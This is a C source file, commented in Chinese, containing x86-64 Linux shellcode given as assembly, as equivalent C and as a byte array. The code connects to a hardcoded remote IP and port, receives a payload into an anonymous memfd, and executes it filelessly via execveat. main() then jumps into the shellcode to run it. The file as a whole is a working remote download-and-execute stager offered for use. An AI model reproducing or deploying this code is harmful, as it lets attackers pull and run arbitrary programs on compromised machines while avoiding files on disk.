#include<stdio.h>
void hexdump(const unsigned char * p, int len)
{
    for(int i=0;i<len;++i)
    {
        printf("\\x%02x", p[i]);
    }
    printf("\n");
}

int main()
{
puts(
"push 0x29;"\
"pop rax;"\
"cdq ;"\
"push 2;"\
"pop rdi;"\
"push 1;"\
"pop rsi;"\
"syscall ;"\
//socket fd放在rbx
"mov rbx, rax;"\
//connect
"xchg rax, rdi;"\
"movabs rcx, 0xd094e75d5dd0002;"\
"push rcx;"\
"mov rsi, rsp;"\
"push 0x10;"\
"pop rdx;"\
"push 0x2a;"\
"pop rax;"\
"syscall;"\
//接收文件长度，存放在ebp
"mov rdi,rbx;"\
"lea rsi,[rsp];"\
"xor rax,rax;"\
"mov dl, 4;"\
"syscall;"\

"xor rbp,rbp;"\
"mov ebp, dword ptr [rsp];"\
//memfd_create
"xor rax,rax;"\
"push rax;"\
"push 0x13f;"\
"pop rax;"\
"mov rdi,rsp;"\
"push 1;"\
"pop rsi;"\
"syscall;"\
//将fd存放在r15
"mov r15, rax;"\
//ftruncate
"xchg rax,rdi;"\
"mov rsi,rbp;"\
"push 0x4d;"\
"pop rax;"\
"syscall;"\
//size页对齐
"mov eax,ebp;"\
"and eax,0xfff;"\
"test eax,eax;"\
"jz loc;"\
"mov eax,ebp;"\
"lea     edx, [rax+0FFFh];"\
"test eax,eax;"\
"cmovs   eax, edx;"\
"sar     eax, 0Ch;"\
"add     eax, 1;"\
"shl     eax, 0Ch;"\
"cdqe;"\
"jmp mmap;"\
"loc:\n"\
"mov eax,ebp;"\
"cdqe;"\
//mmap
"mmap:\n"\
//对齐后size放到r14
"mov r14,rax;"\

"mov r8,r15;"\
"xor r9,r9;"\
"xor r10,r10;"\
"inc r10;"\
"mov dl,3;"\
"mov rsi,rax;"\
"xor rdi,rdi;"\
"push 9;"\
"pop rax;"\
"syscall;"\
//读取剩余内容到MMAP内存
"mov rdi,rbx;"\
"mov rsi,rax;"\
"mov rdx,rbp;"\
"xor rax,rax;"\
"syscall;"\
//munmap
"mov rdi,rsi;"\
"mov rsi,r14;"\
"push 0xb;"\
"syscall;"\
//execeat(fd, "", argv, env, AT_EMPTY_PATH)
"mov rdi,r15;"\
"xor rax,rax;"\
"push rax;"\
"mov rsi, rsp;"\
"xor rdx,rdx;"\
"xor r10,r10;"\
"push 0x1000;"\
"pop r8;"\
"push 0x142;"\
"pop rax;"\
"syscall;");

    /*
    使用以上ASM代码通过keystone生成，对应C代码：
    socket_desc = socket(AF_INET, SOCK_STREAM, 0);
	if (-1 == socket_desc) {
		perror("cannot create socket");
		exit(1);
	}
	
	// 设置远程服务器的信息
	server.sin_addr.s_addr = inet_addr("117.78.9.13");
	server.sin_family = AF_INET;
	server.sin_port = htons(56789);
	
	// 连接
	if (connect(socket_desc, (struct sockaddr *)&server, sizeof(server)) < 0) {
		perror("cannot connect");
		return 0;
	}
    
    //服务端先发送4字节文件长度（小端序）
    int len = 0;
    read(socket_desc, &len, 4);
    
    int fd = memfd_create("", 1);
    ftruncate(fd, len);
    char * shm = mmap(NULL, PAGE_ALIGN(len), 3, 1, fd, 0);
    if(shm == MAP_FAILED)
    {
        perror("mmap");
        return -1;
    }
    
    read(socket_desc, shm, len);
    munmap(shm, PAGE_ALIGN(len));
    
    execveat(fd, "", 0, 0, 0x1000);
    */
    unsigned char hexData[214] = {
        0x6A, 0x29, 0x58, 0x99, 0x6A, 0x02, 0x5F, 0x6A, 0x01, 0x5E, 0x0F, 0x05, 0x48, 0x89, 0xC3, 0x48,
        0x97, 0x48, 0xB9, 0x02, 0x00, 
        //端口56789
        0xDD, 0xD5, 
        //ip 117.78.9.13
        0x75, 0x4E, 0x09, 0x0D, 
        0x51, 0x48, 0x89, 0xE6, 0x6A,
        0x10, 0x5A, 0x6A, 0x2A, 0x58, 0x0F, 0x05, 0x48, 0x89, 0xDF, 0x48, 0x8D, 0x34, 0x24, 0x48, 0x31,
        0xC0, 0xB2, 0x04, 0x0F, 0x05, 0x48, 0x31, 0xED, 0x8B, 0x2C, 0x24, 0x48, 0x31, 0xC0, 0x50, 0x68,
        0x3F, 0x01, 0x00, 0x00, 0x58, 0x48, 0x89, 0xE7, 0x6A, 0x01, 0x5E, 0x0F, 0x05, 0x49, 0x89, 0xC7,
        0x48, 0x97, 0x48, 0x89, 0xEE, 0x6A, 0x4D, 0x58, 0x0F, 0x05, 0x89, 0xE8, 0x25, 0xFF, 0x0F, 0x00,
        0x00, 0x85, 0xC0, 0x74, 0x1A, 0x89, 0xE8, 0x8D, 0x90, 0xFF, 0x0F, 0x00, 0x00, 0x85, 0xC0, 0x0F,
        0x48, 0xC2, 0xC1, 0xF8, 0x0C, 0x83, 0xC0, 0x01, 0xC1, 0xE0, 0x0C, 0x48, 0x98, 0xEB, 0x04, 0x89,
        0xE8, 0x48, 0x98, 0x49, 0x89, 0xC6, 0x4D, 0x89, 0xF8, 0x4D, 0x31, 0xC9, 0x4D, 0x31, 0xD2, 0x49,
        0xFF, 0xC2, 0xB2, 0x03, 0x48, 0x89, 0xC6, 0x48, 0x31, 0xFF, 0x6A, 0x09, 0x58, 0x0F, 0x05, 0x48,
        0x89, 0xDF, 0x48, 0x89, 0xC6, 0x48, 0x89, 0xEA, 0x48, 0x31, 0xC0, 0x0F, 0x05, 0x48, 0x89, 0xF7,
        0x4C, 0x89, 0xF6, 0x6A, 0x0B, 0x0F, 0x05, 0x4C, 0x89, 0xFF, 0x48, 0x31, 0xC0, 0x50, 0x48, 0x89,
        0xE6, 0x48, 0x31, 0xD2, 0x4D, 0x31, 0xD2, 0x68, 0x00, 0x10, 0x00, 0x00, 0x41, 0x58, 0x68, 0x42,
        0x01, 0x00, 0x00, 0x58, 0x0F, 0x05 
    };
    
    hexdump(hexData, sizeof(hexData));
    fflush(0);

    void (*ptr)() = hexData;
    ptr();

    return 0;
}